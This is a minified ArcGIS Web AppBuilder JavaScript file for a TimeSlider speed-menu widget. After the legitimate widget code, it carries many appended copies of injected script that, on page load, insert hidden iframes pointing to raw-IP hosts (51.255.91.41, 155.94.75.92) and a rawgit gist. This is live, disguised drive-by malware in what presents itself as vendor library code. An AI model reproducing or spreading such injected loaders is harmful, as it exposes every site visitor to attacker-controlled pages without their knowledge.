// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/TimeSlider/SpeedMenu.html":'\x3cdiv class\x3d"speed-container jimu-float-trailing" data-dojo-attach-point\x3d"speedContainerNode"\x3e\r\n\t\x3cdiv class\x3d"speed-label" data-dojo-attach-point\x3d"speedLabelNode" data-dojo-attach-event\x3d"click:_onSpeedLabelClick"\x3e1x\x3c/div\x3e\r\n\t\x3cdiv class\x3d"speed-menu hide" data-dojo-attach-point\x3d"speedMenu" data-dojo-attach-event\x3d"click:_onSelectSpeedItem"\x3e\r\n\t\t\x3c!--\x3cdiv class\x3d"speed-menu-item item-label jimu-ellipsis" title\x3d"${nls.speedLabel}"\x3e${nls.speedLabel}\x3c/div\x3e--\x3e\r\n\t\t\x3cdiv class\x3d"speed-menu-item" speed\x3d"0.25"\x3e\r\n\t\t\t0.25x\x3cdiv class\x3d"jimu-float-trailing check hide"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"speed-menu-item" speed\x3d"0.5"\x3e\r\n\t\t\t0.5x\x3cdiv class\x3d"jimu-float-trailing check hide"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"speed-menu-item" speed\x3d"1" data-dojo-attach-point\x3d"initSpeedItem"\x3e\r\n\t\t\t1x\x3cdiv class\x3d"jimu-float-trailing check hide"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"speed-menu-item" speed\x3d"1.5"\x3e\r\n\t\t\t1.5x\x3cdiv class\x3d"jimu-float-trailing check hide"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"speed-menu-item" speed\x3d"2"\x3e\r\n\t\t\t2x\x3cdiv class\x3d"jimu-float-trailing check hide"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/_base/array dojo/Evented dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./SpeedMenu.html dojo/on dojo/query".split(" "),function(f,d,b,g,h,k,l,m,n,c,e){return f([k,l,m,h],{baseClass:"speed-container",templateString:n,nls:null,menuBox:{w:75,h:120},postCreate:function(){this.inherited(arguments);this._initSpeedMenu()},startup:function(){this.inherited(arguments)},destroy:function(){this.inherited(arguments)},
_initSpeedMenu:function(){this.own(c(this.domNode,"click",d.hitch(this,this._closeSpeedMenu)));this._checks=e(".check",this.speedMenu);c.emit(this.initSpeedItem,"click",{cancelable:!1,bubbles:!0})},_onSelectSpeedItem:function(a){g.map(this._checks,d.hitch(this,function(a){b.addClass(a,"hide")}));if(a.target){var p=b.getAttr(a.target,"speed"),c=e(".check",a.target)[0];b.removeClass(c,"hide");this.speedLabelNode.innerHTML=a.target.innerText;this.emit("selected",p)}},_setMenuPosition:function(){var a=
b.position(this.speedLabelNode);0>a.y-this.menuBox.h-2&&b.setStyle(this.speedMenu,{top:"27px",bottom:"auto"});var c=b.getMarginBox(this.domNode);window.isRTL?0>a.x-this.menuBox.w&&b.setStyle(this.speedMenu,{left:0}):a.x+this.menuBox.w>c.w&&b.setStyle(this.speedMenu,{right:0})},_onSpeedLabelClick:function(a){a.stopPropagation();a.preventDefault();b.hasClass(this.speedMenu,"hide")?(this._setMenuPosition(),this._showSpeedMenu()):this._closeSpeedMenu()},_showSpeedMenu:function(){b.removeClass(this.speedMenu,
"hide");this.emit("open")},_closeSpeedMenu:function(){b.addClass(this.speedMenu,"hide");this.emit("close")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});